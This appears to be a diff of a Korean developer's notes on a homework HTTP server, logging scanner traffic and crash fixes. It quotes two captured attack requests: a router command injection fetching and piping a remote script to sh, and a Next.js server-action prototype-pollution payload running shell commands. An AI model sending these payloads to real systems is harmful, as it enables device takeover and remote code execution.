@@ -226,14 +226,24 @@ Host: proxychecker.vultr.com
 User-Agent: Mozilla/5.0 zgrab/0.x
 Accept: */*
 Accept-Encoding: gzip
+
+POST /tmUnblock.cgi HTTP/1.1
+Host: 158.247.200.157:8080
+User-Agent: Mozilla/5.0 (rondo2012@atomicmail.io)
+Connection: close
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 170
+
+submit_button=&change_action=&action=&commit=0&ttcp_num=2&ttcp_size=2&ttcp_ip=-h%20%60busybox%20wget%20-qO-%20http%3A%2F%2F41.231.37.153%2Frondo.jbt.sh%7Csh%60&StartEPI=1
 ```
 
-순서대로 프록시 테스트, 프록시 테스트, 취약 서버 스캔이라고 한다.
+프록시 테스트, 프록시 테스트, 취약 서버 스캔이라고 한다.
 vps ip는 이미 전세계 스캐너 db에 있어서 포트 8080 열리는 순간 프록시테스트,봇 등등이 접근 시도한다고.
 
 좀있다 와보니 또 서버가 죽어있다
 
-```
+```bash
 Traceback (most recent call last):
   File "/root/projects/2026/computer-network-homework/s10.py", line 73, in <module>
     request = connectionSocket.recv(1024).decode()
@@ -241,3 +251,37 @@ UnicodeDecodeError: 'utf-8' codec can't decode byte 0xeb in position 17: invalid
 ```
 
 UnicodeDecodeError 처리도 추가했다.
+
+```bash
+POST / HTTP/1.1
+Host: 158.247.200.157:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36
+Content-Length: 854
+Content-Type: multipart/form-data; boundary=2f2b5106b032f7e291a2d02568a8fc5ac23b48cd5d392741eb0127979dad
+Next-Action: x
+Accept-Encoding: gzip
+Connection: close
+
+--2f2b5106b032f7e291a2d02568a8fc5ac23b48cd5d392741eb0127979dad
+Content-Disposition: form-data; name="0"
+
+{
+  "then": "$1:__proto__:then",
+  "status": "resolved_model",
+  "reason": -1,
+  "value": "{\"then\":\"$B1337\"}",
+  "_response": {
+    "_prefix": "var res=process.mainModule.require('child_process').execSync('echo csZnynRJpu|md5sum').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
+    "_chunks": "$Q2",
+    "_formData": {
+      "get": "$1:constructor:constructor"
+    }
+  }
+}
+--2f2b5106b032f7e291a2d02568a8fc5ac23b48cd5d392741eb0127979dad
+Content-Disposition: form-data; name="
+Traceback (most recent call last):
+  File "/root/projects/2026/computer-network-homework/s10.py", line 118, in <module>
+    guest, guestbook = body.split("said:", 1)
+ValueError: not enough values to unpack (expected 2, got 1)
+```
